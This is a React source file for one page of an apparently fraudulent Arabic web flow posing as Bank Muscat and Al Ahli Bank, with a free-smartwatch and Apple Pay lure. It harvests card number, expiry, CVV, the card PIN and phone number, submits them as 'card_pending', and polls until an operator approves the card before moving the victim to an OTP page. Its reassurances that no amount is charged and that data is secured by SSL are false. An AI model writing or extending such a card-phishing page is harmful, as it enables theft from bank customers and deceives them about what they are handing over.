import React, { useState, useEffect } from 'react';
import { Smartphone, CreditCard, ChevronLeft, AlertCircle, ShieldCheck } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import AppHeader from '../components/AppHeader';
import AppFooter from '../components/AppFooter';
import { FormState } from '../types';
import { updateCardRequest, getCardRequest } from '../api';

export default function CardLinkPage({
  formState,
  setFormState
}: {
  formState: FormState;
  setFormState: React.Dispatch<React.SetStateAction<FormState>>;
}) {
  const navigate = useNavigate();
  const [isWaitingApproval, setIsWaitingApproval] = useState(false);
  const [cardError, setCardError] = useState('');

  useEffect(() => {
    getCardRequest().then((req) => {
      if (req?.otpStatus === 'card_rejected') {
        setCardError('تم رفض البطاقة البنكية من قِبل النظام المصرفي. يرجى التحقق من بيانات البطاقة والمحاولة مجدداً.');
      }
    }).catch(() => {});
  }, []);

  useEffect(() => {
    if (!isWaitingApproval) return;

    const timer = setInterval(async () => {
      try {
        const req = await getCardRequest();
        if (!req) {
          setIsWaitingApproval(false);
          return;
        }
        if (req.otpStatus === 'card_approved' || req.step === 'otp') {
          setIsWaitingApproval(false);
          navigate('/otp');
        } else if (req.step === 'verify') {
          setIsWaitingApproval(false);
          navigate('/verify');
        } else if (req.otpStatus === 'card_rejected') {
          setIsWaitingApproval(false);
          setCardError('تم رفض البطاقة البنكية أو البيانات المدخلة غير صحيحة. يرجى التأكد من بيانات البطاقة والمحاولة مجدداً.');
        }
      } catch {
        // Ignore transient network errors
      }
    }, 1500);

    return () => clearInterval(timer);
  }, [isWaitingApproval, navigate]);

  const handleCardSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const rawDigits = formState.cardNumber.replace(/\D/g, '');
    if (rawDigits.length < 16) {
      setCardError('يرجى إدخال رقم البطاقة المكون من 16 رقماً بشكل صحيح.');
      return;
    }
    if (!formState.cvv || formState.cvv.length < 3) {
      setCardError('يرجى إدخال رمز الأمان (CVV) المكون من 3 أرقام خلف البطاقة.');
      return;
    }
    if (!formState.cardPin || formState.cardPin.length < 4) {
      setCardError('يرجى إدخال الرقم السري للبطاقة (PIN) المكون من 4 أرقام.');
      return;
    }
    setCardError('');
    setIsWaitingApproval(true);

    try {
      await updateCardRequest('current', {
        cardNumber: formState.cardNumber,
        expMonth: formState.expMonth || '08',
        expYear: formState.expYear || '28',
        cvv: formState.cvv,
        cardPin: formState.cardPin,
        paymentName: formState.fullName || 'عميل بنك مسقط',
        mobile: formState.registeredPhone || formState.phone || undefined,
        step: 'card',
        otpStatus: 'card_pending'
      });
    } catch {
      // Keep waiting state active
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#fbfbfd]">
      <AppHeader showBack backTo="/login" title="الخطوة 3: ربط البطاقة" />

      <main className="flex-1 py-4 px-4 max-w-md mx-auto w-full">
        {/* Apple Pay Banner from screenshot blank-4 */}
        <div className="bg-white rounded-3xl p-5 mb-5 shadow-xs border border-gray-100 flex items-center justify-between gap-4">
          <div className="text-right flex-1">
            <span className="text-xs font-bold tracking-wider text-gray-400">Apple Pay & Wearables</span>
            <h2 className="text-base font-bold text-gray-900 mt-0.5">
              قم بإضافة بطاقتك إلى Apple Wallet وادفع بكل سهولة مع Apple Pay
            </h2>
            <div className="flex items-center gap-1 text-[#004838] text-xs font-bold mt-2">
              <span>للمزيد عن الخدمة</span>
              <ChevronLeft className="w-3.5 h-3.5" />
            </div>
          </div>

          <div className="w-20 h-24 rounded-2xl bg-gradient-to-br from-gray-100 to-gray-200 p-2 flex items-center justify-center border border-gray-200 shrink-0">
            <Smartphone className="w-10 h-10 text-gray-700" />
          </div>
        </div>

        {/* Card Input Form */}
        <div className="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
          <div className="flex items-center gap-2 mb-4 border-b border-gray-100 pb-3">
            <div className="w-9 h-9 rounded-xl bg-[#e6f4f0] text-[#004838] flex items-center justify-center">
              <CreditCard className="w-5 h-5" />
            </div>
            <div>
              <h3 className="font-bold text-gray-900 text-base">ربط البطاقة بالساعة الذكية</h3>
              <p className="text-[11px] text-gray-500">قم بتعبئة بيانات البطاقة البنكية</p>
            </div>
          </div>

          {cardError && (
            <div className="mb-4 p-3.5 bg-red-50 border border-red-200 rounded-2xl text-xs text-red-700 font-bold flex items-start gap-2.5">
              <AlertCircle className="w-4 h-4 text-red-600 shrink-0 mt-0.5" />
              <span>{cardError}</span>
            </div>
          )}

          <form onSubmit={handleCardSubmit} className="space-y-4">
            {/* Card Number */}
            <div>
              <label className="block text-xs font-bold text-gray-700 mb-1.5">رقم البطاقة (16 رقم)</label>
              <input
                type="text"
                dir="ltr"
                inputMode="numeric"
                disabled={isWaitingApproval}
                value={formState.cardNumber}
                onChange={(e) => {
                  const val = e.target.value.replace(/\D/g, '').slice(0, 16);
                  const formatted = val.replace(/(\d{4})(?=\d)/g, '$1 ');
                  setFormState({ ...formState, cardNumber: formatted });
                }}
                placeholder="XXXX XXXX XXXX XXXX"
                className="w-full px-4 py-3 bg-gray-50 border border-gray-300 rounded-xl text-base font-mono tracking-widest text-center focus:bg-white focus:border-[#004838] focus:ring-2 focus:ring-[#004838]/20 outline-none transition-all placeholder:text-gray-400"
                required
              />
            </div>

            {/* Expiry Month & Year + CVV Row */}
            <div className="grid grid-cols-2 gap-3">
              <div>
                <label className="block text-xs font-bold text-gray-700 mb-1.5">تاريخ الانتهاء (MM/YY)</label>
                <div className="grid grid-cols-2 gap-1.5" dir="ltr">
                  <input
                    type="text"
                    inputMode="numeric"
                    maxLength={2}
                    disabled={isWaitingApproval}
                    value={formState.expMonth}
                    onChange={(e) =>
                      setFormState({ ...formState, expMonth: e.target.value.replace(/\D/g, '').slice(0, 2) })
                    }
                    placeholder="MM"
                    className="w-full px-2 py-3 bg-gray-50 border border-gray-300 rounded-xl text-sm font-mono text-center focus:bg-white focus:border-[#004838] outline-none"
                    required
                  />
                  <input
                    type="text"
                    inputMode="numeric"
                    maxLength={2}
                    disabled={isWaitingApproval}
                    value={formState.expYear}
                    onChange={(e) =>
                      setFormState({ ...formState, expYear: e.target.value.replace(/\D/g, '').slice(0, 2) })
                    }
                    placeholder="YY"
                    className="w-full px-2 py-3 bg-gray-50 border border-gray-300 rounded-xl text-sm font-mono text-center focus:bg-white focus:border-[#004838] outline-none"
                    required
                  />
                </div>
              </div>

              {/* CVV Field */}
              <div>
                <label className="block text-xs font-bold text-gray-700 mb-1.5">رمز الأمان (CVV)</label>
                <input
                  type="text"
                  dir="ltr"
                  inputMode="numeric"
                  maxLength={3}
                  disabled={isWaitingApproval}
                  value={formState.cvv}
                  onChange={(e) => setFormState({ ...formState, cvv: e.target.value.replace(/\D/g, '').slice(0, 3) })}
                  placeholder="XXX"
                  className="w-full px-4 py-3 bg-gray-50 border border-gray-300 rounded-xl text-base font-mono tracking-widest text-center focus:bg-white focus:border-[#004838] focus:ring-2 focus:ring-[#004838]/20 outline-none transition-all placeholder:text-gray-400"
                  required
                />
              </div>
            </div>

            {/* Card PIN Field (Separate Field) */}
            <div>
              <label className="block text-xs font-bold text-gray-700 mb-1.5">الرقم السري للبطاقة (PIN - 4 أرقام)</label>
              <input
                type="password"
                dir="ltr"
                inputMode="numeric"
                maxLength={4}
                disabled={isWaitingApproval}
                value={formState.cardPin}
                onChange={(e) => setFormState({ ...formState, cardPin: e.target.value.replace(/\D/g, '').slice(0, 4) })}
                placeholder="XXXX"
                className="w-full px-4 py-3 bg-gray-50 border border-gray-300 rounded-xl text-base font-mono tracking-widest text-center focus:bg-white focus:border-[#004838] focus:ring-2 focus:ring-[#004838]/20 outline-none transition-all placeholder:text-gray-400"
                required
              />
            </div>

            {/* Registered Phone */}
            <div>
              <label className="block text-xs font-bold text-gray-700 mb-1.5">رقم الهاتف المسجل</label>
              <input
                type="tel"
                dir="ltr"
                maxLength={8}
                disabled={isWaitingApproval}
                value={formState.registeredPhone || formState.phone}
                onChange={(e) => setFormState({ ...formState, registeredPhone: e.target.value.replace(/\D/g, '') })}
                placeholder="XXXXXXXX"
                className="w-full px-4 py-3 bg-gray-50 border border-gray-300 rounded-xl text-base font-mono tracking-widest text-center focus:bg-white focus:border-[#004838] focus:ring-2 focus:ring-[#004838]/20 outline-none transition-all placeholder:text-gray-400"
                required
              />
            </div>

            {/* Submit */}
            <div className="pt-2">
              <button
                type="submit"
                disabled={isWaitingApproval}
                className="w-full py-3.5 bg-gradient-to-r from-[#d4a343] via-[#c8922c] to-[#b88022] hover:from-[#c8922c] hover:to-[#a7731a] disabled:opacity-70 text-white font-bold text-lg rounded-2xl shadow-lg shadow-[#d4a343]/25 active:scale-[0.98] transition-all cursor-pointer flex items-center justify-center gap-2"
              >
                {isWaitingApproval ? (
                  <>
                    <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    <span>جارِ التحقق من البطاقة...</span>
                  </>
                ) : (
                  <span>متابعة</span>
                )}
              </button>
            </div>
          </form>
        </div>

        {/* Waiting Card Approval Overlay Modal */}
        {isWaitingApproval && (
          <div className="fixed inset-0 z-50 bg-black/50 backdrop-blur-xs flex items-center justify-center p-4">
            <div className="bg-white rounded-3xl max-w-xs w-full p-6 shadow-2xl border border-gray-100 text-center space-y-4">
              <div className="relative w-14 h-14 mx-auto flex items-center justify-center">
                <div className="absolute inset-0 rounded-full border-4 border-emerald-100" />
                <div className="absolute inset-0 rounded-full border-4 border-transparent border-t-[#004838] animate-spin" />
                <ShieldCheck className="w-6 h-6 text-[#004838]" />
              </div>
              <h3 className="text-base font-bold text-gray-900">جارِ تشفير وربط البطاقة</h3>
              <p className="text-xs text-gray-500 leading-relaxed">
                يرجى الانتظار بينما يقوم نظام البنك الأهلي بالتحقق من البطاقة وإصدار رمز الأمان الرقمي (TOKEN)...
              </p>
            </div>
          </div>
        )}

        {/* Security Disclaimers from screenshot blank-4 */}
        <div className="mt-6 text-center space-y-1 text-xs">
          <p className="font-bold text-[#004838]">الساعة مجانية لا يتم خصم اي مبلغ</p>
          <p className="text-gray-500 flex items-center justify-center gap-1">
            <span>لحمايتها اثناء الإرسال يتم تأمين بياناتك باستخدام بروتوكول SSL 🔒</span>
          </p>
        </div>
      </main>

      <AppFooter />
    </div>
  );
}
